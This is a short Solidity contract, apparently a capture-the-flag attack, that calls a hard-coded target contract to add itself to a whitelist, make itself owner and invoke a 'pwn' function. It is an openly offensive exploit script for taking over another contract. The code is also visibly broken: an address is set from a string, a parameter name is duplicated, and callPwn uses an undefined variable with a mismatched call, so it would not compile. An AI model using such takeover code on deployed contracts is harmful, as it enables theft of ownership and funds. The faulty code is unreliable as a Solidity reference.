// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./interface";

contract Blocked{
    
   address contractAddr = "0x788F8F317e320989364D99A7F5e9bc1fFEbfAC62";

   constructor(string memory name, address addr, address addr) {
    callWhiteList(address(this), name);
    callBeOwner(address(this));
    callPwn(address(this));

   }

   function callWhiteList(address addr, string memory name) external {
    Hacked tom = Hacked(contractAddr);
    tom.addToWhitelist( addr, name);
   }

   function callBeOwner(address addr) external {
    Hacked forMe = Hacked(contractAddr);
    forMe.beOwner(addr);
   }

   function callPwn() external {
     Hacked gone = Hacked(contractAddr);
     gone.pwn(addr);
   }

    
}